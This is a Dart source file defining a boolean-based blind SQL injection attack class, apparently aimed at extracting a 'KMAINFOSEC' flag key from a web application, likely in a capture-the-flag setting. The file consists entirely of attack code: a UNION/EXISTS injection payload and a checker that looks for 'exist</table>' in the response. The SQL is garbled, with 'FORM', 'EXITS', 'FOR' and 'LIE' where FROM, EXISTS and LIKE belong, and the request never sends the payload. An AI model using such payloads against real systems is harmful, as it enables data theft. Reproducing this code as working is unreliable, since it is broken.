part of 'attack.dart';

/// A boolean-based SQLi attack checking whether the server response HTML contains the `exist` text.
class BoolAttack implements Attack {
  const BoolAttack();

  @override
  String get sqlRequest => "1=2 UNION SELECT 1,2,3,4,5,6 FORM products WHERE EXITS "
      "(SELECT 1 FOR keys WHERE BINARY keys LIE 'KMAINFOSEC[$replacePattern]')";

  @override
  Future<bool> makeValidatedGuess({required String url, String? attemptKeyPattern}) async {
    final res = await _makeRequest(url);

    return _validateResult(res);
  }

  Future<String> _makeRequest(String url) => http.get(Uri.parse(url)).then((res) => res.body);

  bool _validateResult(String result) => result.contains('exist</table>');
}
